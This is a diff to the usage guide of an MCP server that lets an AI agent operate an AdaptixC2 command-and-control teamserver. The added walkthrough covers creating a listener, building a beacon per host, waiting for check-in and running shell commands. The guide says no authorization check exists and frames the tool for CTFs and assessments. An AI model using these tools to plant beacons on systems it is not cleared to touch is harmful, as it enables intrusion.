@@ -8,14 +8,17 @@ Assumes the server is installed (`npm install && npm run build`) and you have a
 running AdaptixC2 v1.2 teamserver with operator credentials. **Check the
 version-compatibility warning at the top of the README first.**
 
-> **0.1.0 scope.** The current tools are read-only (recon). Command execution
-> and the execution gate are the next milestone, so this walkthrough covers the
-> recon loop and the raw API by hand; the mutating sections land with those
-> tools.
+> **0.3.0 scope.** 17 tools: recon plus listeners, artifact generation, command
+> execution and cleanup. The **scope gate is still not implemented** — nothing
+> in this server checks that an agent or target is authorized, so run it where
+> something else does (an assessment framework's per-assessment opt-in, or a lab
+> you own), and treat listener/agent/command calls as production changes.
 
 Contents: [Before the first call](#before-the-first-call) · [Register the
 server](#register-the-server) · [Walkthrough: recon](#walkthrough-recon) ·
-[Reading the responses](#reading-the-responses) · [Raw API by hand](#raw-api-by-hand)
+[Walkthrough: a beacon on every host](#walkthrough-a-beacon-on-every-host) ·
+[Reading the responses](#reading-the-responses) · [Raw API by
+hand](#raw-api-by-hand)
 
 ## Before the first call
 
@@ -56,8 +59,48 @@ Claude Code / any `.mcp.json` client:
 3. `adaptix_task_list` — pass an `agent_id` from step 2 to read that agent's
    completed tasks, including command output in `Text`.
 
-Nothing mutates in `0.1.0`: this loop is safe to run against a live engagement
+Nothing here mutates: this loop is safe to run against a live engagement
 without changing state.
+
+## Walkthrough: a beacon on every host
+
+The case this exists for — a CTF or lab with N hosts and an operator watching
+the Adaptix GUI. The MCP does the C2 half; delivery to each host is yours.
+
+1. **Listener, once.**
+   `adaptix_listener_create {name:"ctf-http", type:"BeaconHTTP", config:"{...}"}`.
+   The config is the listener type's own JSON (bind host/port, callback host,
+   TLS). The call now verifies the result: it reports `verified: true` only if
+   the listener is in `/listener/list`, and otherwise fails with what the
+   teamserver said. A listener that "started" but is not in the list is the
+   classic reason beacons never arrive.
+2. **Artifact per host, labelled.**
+
+   ```json
+   {"agent":"beacon","listener_name":"ctf-http",
+    "config":"{\"os\":\"linux\",\"arch\":\"amd64\",\"format\":\"elf\"}",
+    "label":"10.10.10.5",
+    "output_dir":"/path/to/assessment/logs/c2"}
+   ```
+
+   Result: `path .../beacon-10.10.10.5.elf`. Repeat for each host. The label is
+   what keeps four builds four files; without it the teamserver's identical
+   name would have the second build overwrite the first, and the counter
+   (`-2`, `-3`) is the fallback if you forget.
+3. **Deliver and run** it on the host — a loopback web server reached through
+   the pivot, `certutil`/`curl`, an SMB share: outside this MCP.
+4. **Wait for check-in.**
+   `adaptix_agent_wait {expected:1, match:"10.10.10.5", timeout_s:120}` per
+   host, or `{expected:4}` once after the batch. `ok:true` returns the agent
+   records; `ok:false` returns the count it reached plus the usual causes
+   (payload never ran, no egress, the build calls a different listener).
+5. **Task it.**
+   `adaptix_agent_command_execute {agent_id:"...", cmdline:"shell",
+   data:"{\"command\":\"id\"}", wait_answer:true}` for the answer inline, or
+   `wait_answer:false` then `adaptix_task_list` — output is asynchronous, so
+   poll rather than assuming failure.
+6. **Cleanup.** `adaptix_agent_remove {agent_ids:[...]}` and
+   `adaptix_task_delete`; stop the listener last so re-connects still land.
 
 ## Reading the responses
 
@@ -73,6 +116,13 @@ Gotchas:
 - Task output is asynchronous. A command's result appears in
   `adaptix_task_list` only after the beacon has picked up the task and written
   the result back — poll, do not expect it on the first call.
+- Listener and command calls answer **HTTP 200 even when they fail**, with
+  `{ok, message}`. `adaptix_listener_create` verifies against
+  `/listener/list` for that reason; for the rest, read `message` — a bare
+  `{ok:true}` with no error text is the success shape.
+- `adaptix_agent_wait` counts agents, not hosts: a host that re-beacons after a
+  restart shows two agents until the old one is removed. Use `match` with the
+  IP or hostname to make the count about the host you care about.
 
 ## Raw API by hand
 
